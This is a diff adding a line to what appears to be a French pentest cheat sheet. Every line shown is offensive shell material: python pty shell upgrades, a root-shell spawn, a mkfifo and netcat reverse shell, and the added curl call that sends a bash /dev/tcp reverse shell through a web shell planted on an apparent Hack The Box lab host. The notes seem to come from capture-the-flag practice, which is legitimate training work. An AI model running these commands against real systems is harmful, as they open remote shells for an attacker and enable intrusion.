@@ -22,6 +22,7 @@
 	- Spawn un meilleur shell --> `python -c 'import pty;pty.spawn ("/bin/bash")'` ou `python3 -c 'import pty;pty.spawn ("/bin/bash")'`
 	- Spawn un shell root --> `python3 -c 'import pty,os; os.setuid(0);os.setgid(0);pty.spawn("/bin/bash")'`
 	- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.1 1234 >/tmp/f`
+    - REVERESE SHELL VIA URL --> `curl -G 'http://billing.nexus.htb/storage/tinymce/fee2ef42df021eb62671949f1a4aa32e.php' --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.17.71/1234 0>&1"'`
 
  - Reverse shell via SQL :
 ```sql
